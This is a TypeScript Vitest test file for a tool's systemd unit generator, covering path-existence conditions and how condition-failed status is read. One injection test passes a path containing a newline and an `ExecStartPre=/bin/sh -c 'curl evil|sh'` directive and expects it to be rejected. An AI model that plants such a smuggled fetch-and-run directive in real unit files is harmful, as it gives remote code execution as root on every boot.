// @vitest-environment node
//
// The unit is gated on the files it cannot run without, so an install that is
// no longer there STOPS instead of thrashing.
//
// Without the gate, `npm rm -g failproofai` leaves a unit whose worker script
// npm just deleted, and a deleted DAEMON BINARY is worse still: ExecStart fails
// 203/EXEC under `Restart=on-failure` and cycles until it trips the start-limit
// and latches into "start request repeated too quickly" — a state that then
// refuses a legitimate restart later. (That latch is a bug this repo has
// already had to fix once, from the other end, with `systemctl reset-failed`.)
//
// A failed condition is not a failure: systemd skips the job and names the
// missing path, and `daemonServiceStatus()` reads it back as `condition-failed`
// so the next CLI command can clear `daemonConfigured` rather than leave the
// machine denying every tool call with nothing to point at.

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

let dir: string;
const originalEnv = { ...process.env };

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "fpai-unit-"));
  vi.resetModules();
});

afterEach(() => {
  process.env = { ...originalEnv };
  rmSync(dir, { recursive: true, force: true });
});

describe("hooks/daemon-service — unit conditions", () => {
  it("gates the unit on the daemon binary AND the worker script", async () => {
    const pkgRoot = join(dir, "pkg");
    mkdirSync(join(pkgRoot, "dist"), { recursive: true });
    const workerScript = join(pkgRoot, "dist", "worker.mjs");
    writeFileSync(workerScript, "//worker\n");
    process.env.FAILPROOFAI_PACKAGE_ROOT = pkgRoot;
    delete process.env.FAILPROOFAI_WORKER_CMD;

    const { systemdUnitContents, resolveWorkerCommand } = await import(
      "../../src/hooks/daemon-service"
    );
    // Written to disk because only paths that EXIST are gated on — which is how
    // an ExecStart carrying arguments is told apart from a bare path.
    const binary = join(dir, "failproofaid");
    writeFileSync(binary, "#!/bin/sh\n", { mode: 0o755 });
    const unit = systemdUnitContents(binary, resolveWorkerCommand(), null);

    expect(unit).toContain(`ConditionPathExists=${binary}`);
    expect(unit).toContain(`ConditionPathExists=${workerScript}`);
    // In [Unit], not [Service] — systemd only honours it in the former, and a
    // misplaced directive is silently ignored rather than rejected.
    const unitSection = unit.slice(unit.indexOf("[Unit]"), unit.indexOf("[Service]"));
    expect(unitSection).toContain("ConditionPathExists=");
  });

  it("gates on the binary alone when the worker command is someone else's", async () => {
    // FAILPROOFAI_WORKER_CMD is an arbitrary shell command — a wrapper, an
    // interpreter with flags. Guessing which token in it must exist would gate
    // the service on a path nobody promised, so no condition is the right
    // answer rather than a guessed one.
    process.env.FAILPROOFAI_WORKER_CMD = "/usr/local/bin/my-wrapper --serve";
    const { systemdUnitContents, workerScriptPath } = await import(
      "../../src/hooks/daemon-service"
    );
    const binary = join(dir, "failproofaid");
    writeFileSync(binary, "#!/bin/sh\n", { mode: 0o755 });
    const unit = systemdUnitContents(binary, process.env.FAILPROOFAI_WORKER_CMD, null);

    expect(workerScriptPath()).toBeNull();
    expect(unit).toContain(`ConditionPathExists=${binary}`);
    // Exactly one condition — the binary. The wrapper still appears in the unit
    // as the Environment= value (that is its job); what must not happen is a
    // guessed token from it becoming a path the service is gated on.
    const conditions = unit.match(/^ConditionPathExists=.*$/gm) ?? [];
    expect(conditions).toHaveLength(1);
    expect(conditions.join("\n")).not.toContain("my-wrapper");
  });

  it("does not gate on a worker script that is not there yet", async () => {
    // A condition baked in against a missing path would make the freshly
    // installed unit skip on its very first start.
    process.env.FAILPROOFAI_PACKAGE_ROOT = join(dir, "nonexistent");
    delete process.env.FAILPROOFAI_WORKER_CMD;
    const { workerScriptPath } = await import("../../src/hooks/daemon-service");
    expect(workerScriptPath()).toBeNull();
  });

  it("still refuses paths that would inject directives into the unit", async () => {
    // The condition lines interpolate a path into a root-owned file loaded at
    // every boot; they must go through the same guard ExecStart does. A newline
    // ENDS the directive, so anything after it is an injected setting.
    process.env.FAILPROOFAI_PACKAGE_ROOT = join(dir, "pkg");
    delete process.env.FAILPROOFAI_WORKER_CMD;
    const { systemdUnitContents } = await import("../../src/hooks/daemon-service");
    expect(() =>
      systemdUnitContents(`/tmp/x\nExecStartPre=/bin/sh -c 'curl evil|sh'`, null, null),
    ).toThrow();
  });

  it("does not gate on an ExecStart that carries arguments", async () => {
    // `binaryPath` is an ExecStart value, and systemd accepts arguments there —
    // this repo's own systemd lifecycle tests set FAILPROOFAI_DAEMON_BINARY to
    // `/usr/bin/sleep infinity`. `ConditionPathExists=` takes a PATH, so gating
    // on that string hunts for a file literally named "sleep infinity", never
    // finds it, and skips a unit that would have run perfectly. Splitting on
    // whitespace to recover the binary is not an option either: a path may
    // legally contain spaces.
    process.env.FAILPROOFAI_PACKAGE_ROOT = join(dir, "nope");
    delete process.env.FAILPROOFAI_WORKER_CMD;
    const { systemdUnitContents } = await import("../../src/hooks/daemon-service");
    const unit = systemdUnitContents("/usr/bin/sleep infinity", null, null);

    expect(unit).toContain("ExecStart=/usr/bin/sleep infinity");
    expect(unit).not.toContain("ConditionPathExists=");
  });

  it("gates on a real binary that exists on disk", async () => {
    const binary = join(dir, "failproofaid");
    writeFileSync(binary, "#!/bin/sh\n", { mode: 0o755 });
    process.env.FAILPROOFAI_PACKAGE_ROOT = join(dir, "nope");
    delete process.env.FAILPROOFAI_WORKER_CMD;
    const { systemdUnitContents } = await import("../../src/hooks/daemon-service");
    expect(systemdUnitContents(binary, null, null)).toContain(`ConditionPathExists=${binary}`);
  });
});

describe("hooks/daemon-service — condition-failed status", () => {
  // The subprocess half reads /etc/systemd/system at a fixed path that no unit
  // test may write, so the INTERPRETATION is tested here and the live systemd
  // behaviour is proven in the container test.
  it("treats a literal `no` as condition-failed", async () => {
    const { interpretConditionResult } = await import("../../src/hooks/daemon-service");
    expect(interpretConditionResult("no\n")).toBe("condition-failed");
    expect(interpretConditionResult("no")).toBe("condition-failed");
  });

  it("treats everything else as stopped", async () => {
    // A restart in flight reports `yes` and looks identical to a stopped unit;
    // clearing `daemonConfigured` on it would silently downgrade a healthy
    // machine to the in-process path. An empty answer (a unit systemd has not
    // evaluated since boot) and an unknown future word must land the same way.
    const { interpretConditionResult } = await import("../../src/hooks/daemon-service");
    for (const raw of ["yes\n", "", "  ", "unknown", "No"]) {
      expect(interpretConditionResult(raw)).toBe("stopped");
    }
  });
});
